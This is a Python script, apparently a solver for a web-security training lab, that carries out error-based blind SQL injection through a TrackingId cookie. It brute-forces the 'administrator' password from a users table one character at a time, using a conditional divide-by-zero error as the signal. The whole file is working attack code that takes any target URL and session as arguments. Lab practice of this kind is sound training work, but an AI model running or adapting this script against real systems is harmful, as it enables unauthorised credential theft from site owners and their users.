import requests
import string
import sys

arg_len = len(sys.argv)
if arg_len<4:
    print("Usage : url TrackingId session")
    exit(0)

url=sys.argv[1]
TrackingId=sys.argv[2]
session=sys.argv[3]
print("Target :",url)
print("Cookie params :",TrackingId,session)

injection="'||(SELECT CASE WHEN SUBSTR(password,{},1)='{}' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'"
cookie="TrackingId="+TrackingId+"{injection}; session="+session
header_dict={
"Connection": "close",
"User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.61 Safari/537.36"
}

password=[]
for i in range(1,21):
    print("\nindex : "+str(i))
    for st in string.printable[0:40]:
        header_dict["Cookie"]=cookie.format(injection=injection.format(i,st))
        print("Cookie : "+header_dict["Cookie"],end="\r")
        response = requests.get(url,headers=header_dict)
        if bytes('Internal',"UTF-8") in response.content:
          print("\nSucces : "+st)
          password.append(st)
          break
    

print("".join(str(e) for e in password))
